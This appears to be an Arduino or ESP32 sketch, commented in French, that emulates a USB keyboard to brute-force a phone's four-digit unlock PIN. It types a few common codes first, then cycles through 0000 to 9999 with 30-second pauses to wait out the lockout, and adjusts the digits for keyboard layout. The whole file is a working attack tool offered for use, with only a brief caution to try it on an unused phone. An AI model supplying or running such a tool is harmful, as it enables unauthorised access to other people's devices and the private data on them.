#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;


// code experimental a ne pas faire sur n'importe quel telephone (pluto sur nu tel que vous utiliser plus)
// Conversion QWERTY ->  en chiffre j'ai pas trouvé mieu
char convertQwertyDigit(char c) {
  switch (c) {
    case '0': return ')';
    case '1': return '!';
    case '2': return '@';
    case '3': return '#';
    case '4': return '$';
    case '5': return '%';
    case '6': return '^';
    case '7': return '&';
    case '8': return '*';
    case '9': return '(';
  }
  return c;
}

// Fonction pour taper un code 4 chiffres
void typeCode(const char *code) {
  for (int i = 0; i < 4; i++) {
    Keyboard.write(convertQwertyDigit(code[i]));
    delay(40);
  }
  Keyboard.write(KEY_RETURN);
  delay(120);
}

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(2000);

  Keyboard.write(KEY_HOME);

  // ---- Codes à taper en premier car les plus commun pour avoir plus de chances de trouver le code ----
  typeCode("1234");
  typeCode("8888");
  typeCode("1111");
  typeCode("0852");

  // ---- Brute force le code de deverouillage 0000 -> 9999 ----
  for (int code = 0; code <= 9999; code++) {

    Keyboard.write(KEY_HOME);

    char buf[5];
    sprintf(buf, "%04d", code);
    typeCode(buf);
    delay(30000); // attente suite à de nobreuses (tentatives verrouillage de 30 secondes)
  }

  while (true); // stop
}

void loop() {}
